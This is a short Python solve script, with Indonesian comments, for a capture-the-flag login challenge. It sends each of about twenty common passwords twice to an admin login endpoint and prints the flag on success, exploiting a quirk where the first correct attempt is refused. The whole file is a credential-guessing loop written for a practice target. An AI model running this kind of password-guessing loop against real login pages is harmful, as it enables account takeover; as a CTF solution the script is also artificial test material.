#!/usr/bin/env python3
import requests

URL = "https://codinghorror.sillyctf.psuccso.org/login"

# Dari komentar HTML challenge.
BANNED_PASSWORDS = [
    "password",
    "123456",
    "admin123",
    "letmein",
    "welcome",
    "monkey",
    "qwerty123",
    "dragon",
    "master",
    "trustno1",
    "abc123",
    "password1",
    "sup3r_s3cur3_p@ssw0rd",
    "iloveyou",
    "princess",
    "rockyou",
    "shadow",
    "sunshine",
    "12345678",
    "football",
    "starwars",
    "whatever",
]


def main() -> None:
    s = requests.Session()

    for password in BANNED_PASSWORDS:
        payload = {"username": "admin", "password": password}

        # Attempt pertama: password valid justru ditolak.
        s.post(URL, json=payload, timeout=10)

        # Attempt kedua dengan password sama: akan sukses untuk password yang benar.
        r2 = s.post(URL, json=payload, timeout=10)
        data = r2.json()

        if data.get("success"):
            print(data.get("flag", ""))
            return

    raise SystemExit("Flag tidak ditemukan")


if __name__ == "__main__":
    main()
